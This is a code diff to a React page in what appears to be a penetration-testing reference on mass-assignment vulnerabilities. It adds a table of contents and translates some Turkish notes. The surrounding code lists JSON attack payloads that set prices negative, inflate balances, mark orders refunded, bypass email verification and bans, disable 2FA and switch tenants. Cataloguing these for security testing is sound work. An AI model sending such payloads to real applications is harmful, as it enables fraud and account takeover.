@@ -5,12 +5,22 @@ import { Server, ArrowLeft, ArrowRight } from "lucide-react"
 import Link from "next/link"
 import { PayloadList } from "@/components/docs/payload-list"
 import { Callout } from "@/components/docs/callout"
+import { TableOfContents } from "@/components/docs/table-of-contents"
+
+const tocItems = [
+  { id: "role-escalation", title: "Role / Privilege Escalation", level: 2 },
+  { id: "financial", title: "Financial Manipulation", level: 2 },
+  { id: "account", title: "Account Manipulation", level: 2 },
+  { id: "framework", title: "Framework-Specific", level: 2 },
+]
 
 const fadeIn = { hidden: { opacity: 0, y: 20 }, visible: { opacity: 1, y: 0 } }
 const stagger = { visible: { transition: { staggerChildren: 0.05 } } }
 
 export default function MassAssignmentPage() {
   return (
+    <>
+    <TableOfContents items={tocItems} />
     <motion.div initial="hidden" animate="visible" variants={stagger} className="max-w-4xl">
       <motion.div variants={fadeIn} className="mb-8">
         <div className="flex items-center gap-2 text-green-400 text-sm font-medium mb-4">
@@ -30,7 +40,7 @@ export default function MassAssignmentPage() {
       </Callout>
 
       <motion.section variants={fadeIn} className="mt-12">
-        <h2 className="text-2xl font-semibold text-foreground mb-4">Role / Privilege Escalation</h2>
+        <h2 id="role-escalation" className="text-2xl font-semibold text-foreground mb-4 scroll-mt-20">Role / Privilege Escalation</h2>
         <PayloadList
           title="Role Injection Payloads"
           initialShow={8}
@@ -50,7 +60,7 @@ export default function MassAssignmentPage() {
       </motion.section>
 
       <motion.section variants={fadeIn} className="mt-12">
-        <h2 className="text-2xl font-semibold text-foreground mb-4">Financial Manipulation</h2>
+        <h2 id="financial" className="text-2xl font-semibold text-foreground mb-4 scroll-mt-20">Financial Manipulation</h2>
         <PayloadList
           title="Price/Balance Payloads"
           initialShow={8}
@@ -59,7 +69,7 @@ export default function MassAssignmentPage() {
             { code: `{"item":"product","price":-100}`, note: "Negatif fiyat" },
             { code: `{"item":"product","discount":100}`, note: "%100 indirim" },
             { code: `{"item":"product","quantity":1,"total":0}`, note: "Total override" },
-            { code: `{"user":"me","balance":999999}`, note: "Bakiye manipulation" },
+            { code: `{"user":"me","balance":999999}`, note: "Balance manipulation" },
             { code: `{"user":"me","credits":99999}`, note: "Kredi ekleme" },
             { code: `{"order_id":"123","status":"refunded"}`, note: "Refund status" },
             { code: `{"subscription":"premium","trial_end":"2099-12-31"}`, note: "Trial süresini uzatma" },
@@ -69,26 +79,26 @@ export default function MassAssignmentPage() {
       </motion.section>
 
       <motion.section variants={fadeIn} className="mt-12">
-        <h2 className="text-2xl font-semibold text-foreground mb-4">Account Manipulation</h2>
+        <h2 id="account" className="text-2xl font-semibold text-foreground mb-4 scroll-mt-20">Account Manipulation</h2>
         <PayloadList
           title="Account Property Payloads"
           initialShow={8}
           payloads={[
             { code: `{"email":"test@test.com","verified":true}`, note: "Email verification bypass" },
             { code: `{"email":"test@test.com","email_confirmed":true}`, note: "Email confirmation bypass" },
-            { code: `{"user":"test","account_status":"active"}`, note: "Account aktivasyonu" },
+            { code: `{"user":"test","account_status":"active"}`, note: "Account activation" },
             { code: `{"user":"test","banned":false}`, note: "Ban bypass" },
             { code: `{"user":"test","2fa_enabled":false}`, note: "2FA devre dışı" },
             { code: `{"user":"test","password_reset_required":false}`, note: "Password reset bypass" },
             { code: `{"user":"test","login_attempts":0}`, note: "Login attempt reset" },
-            { code: `{"user":"test","org_id":"target_org"}`, note: "Organization değiştirme" },
+            { code: `{"user":"test","org_id":"target_org"}`, note: "Organizasyon değiştirme" },
             { code: `{"user":"test","tenant_id":"other_tenant"}`, note: "Multi-tenant bypass" },
           ]}
         />
       </motion.section>
 
       <motion.section variants={fadeIn} className="mt-12">
-        <h2 className="text-2xl font-semibold text-foreground mb-4">Framework-Specific</h2>
+        <h2 id="framework" className="text-2xl font-semibold text-foreground mb-4 scroll-mt-20">Framework-Specific</h2>
         <PayloadList
           title="Framework Payloads"
           initialShow={6}
@@ -122,5 +132,6 @@ export default function MassAssignmentPage() {
         </Link>
       </motion.div>
     </motion.div>
+    </>
   )
 }
